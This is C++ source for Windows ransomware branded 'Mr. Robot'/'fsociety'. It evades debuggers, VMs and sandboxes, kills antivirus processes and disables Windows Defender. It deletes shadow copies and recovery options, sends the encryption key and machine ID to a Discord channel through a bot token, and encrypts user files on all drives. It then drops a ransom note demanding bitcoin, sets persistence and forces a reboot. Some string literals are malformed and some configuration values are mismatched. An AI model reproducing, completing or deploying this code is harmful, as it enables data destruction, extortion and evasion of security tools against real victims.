#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <vector>
#include <random>
#include <chrono>
#include <cpr/cpr.h>
#include <nlohmann/json.hpp>
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

// CONFIGURATION - CUSTOM VALUES
const std::string CONTACT = "discord: "himself"";
const std::string BTC_ADDRESS = "";
const std::string BOT_TOKEN = "MTQ5MTA2NDA0NTAyNzk4MzQ1MQ.GCm6Ro.vIizhmuwoicySiUUGLaQG9E-OxVOYC4W4-EWZ8";
const std::string CHANNEL_ID = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh";
const std::string MUTEX_NAME = "mWwhGutITllFvBTP";
const std::string SALT = "3Y9lbIHEjpS4fLYmGQ9gdqfZOSLXUdAp";

const std::string DISCORD_API = "https://discord.com/api/v9/channels/" + CHANNEL_ID + "/messages";

// Step 3A: Check for existing mutex
bool check_mutex() {
    HANDLE hMutex = CreateMutexA(NULL, TRUE, MUTEX_NAME.c_str());
    if(GetLastError() == ERROR_ALREADY_EXISTS) return true;
    return false;
}

// Step 3B: Generate AES key with salt
std::string generate_aes_key() {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    BYTE key[32] = {0};
    
    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
    CryptGenRandom(hProv, 32, key);
    CryptReleaseContext(hProv, 0);
    
    std::string final_key = std::string((char*)key, 32) + SALT;
    return final_key.substr(0, 32);
}

// Step 3C: Get machine fingerprint
std::string get_machine_id() {
    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, NULL);
    char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer_name);
    GetComputerNameA(computer_name, &size);
    return std::to_string(serial) + "_" + std::string(computer_name);
}

// Step 4A: Send key to Discord
void send_key_to_discord(const std::string& aes_key, const std::string& machine_id) {
    json payload = {
        {"content", "```NEW VICTIM
ID: " + machine_id + "
KEY: " + aes_key + "
BTC: 
CONTACT: discord: "himself"
TIME: " + std::to_string(time(0)) + "```"}
    };
    cpr::Post(cpr::Url{DISCORD_API},
              cpr::Header{{"Authorization", "Bot " + BOT_TOKEN},
                         {"Content-Type", "application/json"}},
              cpr::Body{payload.dump()});
}

// Step 4B: Encrypt file
void encrypt_file(const fs::path& filepath, const std::string& key) {
    std::ifstream in(filepath, std::ios::binary);
    std::vector<BYTE> data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
    in.close();
    
    for(size_t i = 0; i < data.size(); i++) {
        data[i] ^= key[i % key.size()];
    }
    
    std::ofstream out(filepath, std::ios::binary);
    out.write((char*)data.data(), data.size());
    out.close();
    
    fs::rename(filepath, filepath.string() + ".mrrobot");
}

// Step 4C: Check if file should be encrypted
bool should_encrypt(const fs::path& path) {
    std::vector<std::string> skip_dirs = {"Windows", "Program Files", "Program Files (x86)", "System32", "AppData", "Temp"};
    for(const auto& skip : skip_dirs) {
        if(path.string().find(skip) != std::string::npos) return false;
    }
    
    std::vector<std::string> extensions = {".txt", ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".jpg", ".png", 
                                           ".mp4", ".mp3", ".zip", ".rar", ".7z", ".db", ".sqlite", ".wallet", 
                                           ".key", ".dat", ".bak", ".backup", ".cpp", ".py", ".js", ".html"};
    for(const auto& ext : extensions) {
        if(path.extension() == ext) return true;
    }
    return false;
}

// Step 5A: Encrypt all files
void encrypt_all_files(const fs::path& root, const std::string& key) {
    for(const auto& entry : fs::recursive_directory_iterator(root)) {
        if(fs::is_regular_file(entry) && should_encrypt(entry)) {
            try {
                encrypt_file(entry.path(), key);
            } catch(...) {}
        }
    }
}

// Step 5B: Create ransom note with custom contact and BTC
void create_ransom_note(const std::string& machine_id) {
    std::string note = R"(
================================================================================
                                                                                
   *******   ******   *******   **    **   *******   **        *******          
  **/////** /**/**   **/////** /**   /**  /**////** /**       /**////**         
 **     //**/**//**  **     //**/**   /**  /**   /** /**       /**   /**        
/**      /**/** //** /**      /**//** /**  /*******  /**       /*******         
/**      /**/**  //**/**      /** //****   /**///**  /**       /**////**        
//**     ** /**   /**//**     **   /**//**  /**  //** /**       /**   /**        
 //*******  /***   /** //*******    /** //** /**   //**/********/*******         
  ///////   ///    //   ///////     //   //  //     // //////// ///////          
                                                                                
   YOUR FILES HAVE BEEN ENCRYPTED                                             
                                                                                
   "I wanted to save the world. I wanted to fix the mess they created."       
                                                      - Mr. Robot             
                                                                                
   +-----------------------------------------------------------------------+    
   | MACHINE ID: )" + machine_id + R"(                                   |    
   | BTC ADDRESS: )" + BTC_ADDRESS + R"(                                 |    
   | CONTACT: )" + CONTACT + R"(                                         |    
   +-----------------------------------------------------------------------+    
                                                                                
   HOW TO DECRYPT:                                                            
   1. Send 0.5 BTC to the address above                                       
   2. Contact us with your Machine ID                                         
   3. You will receive your decryption key                                    
                                                                                
   YOU HAVE 72 HOURS                                                          
                                                                                
   +-----------------------------------------------------------------------+    
   |  #FSOCIETY  #MRROBOT  #RANSOMWARE                                   |    
   +-----------------------------------------------------------------------+    
                                                                                
================================================================================
)";
    
    std::ofstream note_file("C:\\Users\\Public\\Desktop\\FSOCIETY_README.txt");
    note_file << note;
    note_file.close();
}

// Step 5C: Set wallpaper
void set_wallpaper() {
    system("reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f");
    system("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
}

// Step 6A: Disable recovery
void disable_recovery() {
    system("vssadmin delete shadows /all /quiet");
    system("bcdedit /set {default} recoveryenabled No");
    system("bcdedit /set {default} bootstatuspolicy ignoreallfailures");
    system("wbadmin delete catalog -quiet");
}

// Step 6B: Kill AV and security processes
void kill_security() {
    std::vector<std::string> av = {"avguard", "avgnt", "avcenter", "msmpeng", "Norton", "McAfee", "kav", "Kaspersky", 
                                   "Avast", "AVG", "Bitdefender", "Malwarebytes", "Sophos", "ESET", "TrendMicro"};
    for(const auto& a : av) {
        system(("taskkill /f /im " + a + ".exe 2>nul").c_str());
    }
    system("net stop WinDefend /y 2>nul");
    system("net stop MpsSvc /y 2>nul");
    system("sc config WinDefend start= disabled 2>nul");
}

// Step 6C: Add persistence
void add_persistence() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "WindowsSecurityUpdate", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
    RegCloseKey(hKey);
    
    char startup[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);
    std::string startup_path = std::string(startup) + "\\WindowsUpdate.exe";
    CopyFileA(path, startup_path.c_str(), FALSE);
}

// Step 7A: Anti-debug
bool is_debugged() {
    if(IsDebuggerPresent()) return true;
    __try { __asm int 3 }
    __except(EXCEPTION_EXECUTE_HANDLER) { return false; }
    return true;
}

// Step 7B: Anti-VM
bool is_vm() {
    std::ifstream systeminfo("C:\\Windows\\System32\\drivers\\etc\\hosts");
    std::string line;
    while(std::getline(systeminfo, line)) {
        if(line.find("vmware") != std::string::npos || 
           line.find("vbox") != std::string::npos ||
           line.find("qemu") != std::string::npos) return true;
    }
    return false;
}

// Step 7C: Sandbox detection
bool is_sandbox() {
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    if(memInfo.ullTotalPhys / (1024 * 1024 * 1024) < 3) return true;
    
    ULARGE_INTEGER totalBytes;
    GetDiskFreeSpaceExA("C:\\", NULL, &totalBytes, NULL);
    if(totalBytes.QuadPart / (1024 * 1024 * 1024) < 60) return true;
    
    if(FindWindowA(NULL, "Sandboxie Control")) return true;
    
    return false;
}

// Step 8A: Main execution
int main() {
    if(check_mutex()) return 0;
    if(is_debugged() || is_vm() || is_sandbox()) return 0;
    
    Sleep(30000);
    
    kill_security();
    disable_recovery();
    
    std::string aes_key = generate_aes_key();
    std::string machine_id = get_machine_id();
    send_key_to_discord(aes_key, machine_id);
    
    encrypt_all_files("C:\\Users", aes_key);
    encrypt_all_files("C:\\Users\\Public", aes_key);
    
    for(char drive = 'D'; drive <= 'Z'; drive++) {
        std::string path = std::string(1, drive) + ":\\";
        if(GetDriveTypeA(path.c_str()) != DRIVE_NO_ROOT_DIR && 
           GetDriveTypeA(path.c_str()) != DRIVE_CDROM) {
            encrypt_all_files(path, aes_key);
        }
    }
    
    create_ransom_note(machine_id);
    set_wallpaper();
    add_persistence();
    
    MessageBoxA(NULL, 
                ("YOUR FILES HAVE BEEN ENCRYPTED

"
                 "Contact: " + std::string(CONTACT) + "
"
                 "BTC: " + std::string(BTC_ADDRESS) + "

"
                 "Check your desktop for FSOCIETY_README.txt").c_str(),
                "MR. ROBOT RANSOMWARE",
                MB_OK | MB_ICONHAND | MB_SYSTEMMODAL);
    
    system("shutdown /r /t 60 /c "Fsociety was here. Your files are encrypted. Contact " + std::string(CONTACT) + """);
    
    return 0;
}
